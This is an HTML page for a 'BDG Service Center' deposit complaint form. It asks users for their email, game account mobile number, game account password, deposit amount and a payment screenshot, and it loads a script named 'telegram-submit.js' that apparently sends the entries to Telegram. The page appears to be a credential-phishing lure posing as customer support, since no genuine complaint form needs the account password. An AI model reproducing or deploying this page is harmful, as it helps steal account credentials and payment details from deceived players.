<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deposite Submit Page - BDG Service Center</title>
    <link rel="icon" href="../IMAGE/faviconV2.png" type="image/png">
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="container">

        <main class="main">

            <a href="index.html" class="back-circle" title="Back">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
            </a>

            <h1 class="heading">DEPOSITE COMPLAIN PAGE</h1>

            <form id="depositForm" class="form">
                <label for="email">Email Id</label>
                <input type="email" id="email" name="email" placeholder="Enter Your Email Id" required>

                <label for="mobile">Game Account Mobile Number</label>
                <input type="tel" id="mobile" name="mobile" placeholder="Enter Your Mobile Number" required>

                <label for="password">Game Account Password</label>
                <input type="password" id="password" name="password" placeholder="Enter Your Password" required>

                <label for="amount">Enter Deposite Amount</label>
                <input type="number" id="amount" name="amount" placeholder="Enter Deposite Amount" min="0" required>

                <label for="problem">Select Deposite Problem</label>
                <select id="problem" name="problem" required>
                    <option value="" disabled selected>Select Problem</option>
                    <option value="processing">Processing</option>
                    <option value="reject">Reject</option>
                    <option value="failed">Failed</option>
                    <option value="not-received">Not Recevie Game Account</option>
                </select>

                <label for="paymentImage">Upload Payment Image</label>
                <input type="file" id="paymentImage" name="paymentImage" accept="image/*" required>

                <button type="submit" class="confirm-btn">Complain Now</button>
            </form>

        </main>

    </div>

    <div id="loadingPopup" class="popup-overlay hidden">
        <div class="popup-box">
            <div class="spinner"></div>
            <p class="popup-text">Please wait...</p>
        </div>
    </div>

    <script src="telegram-submit.js"></script>
</body>
</html>
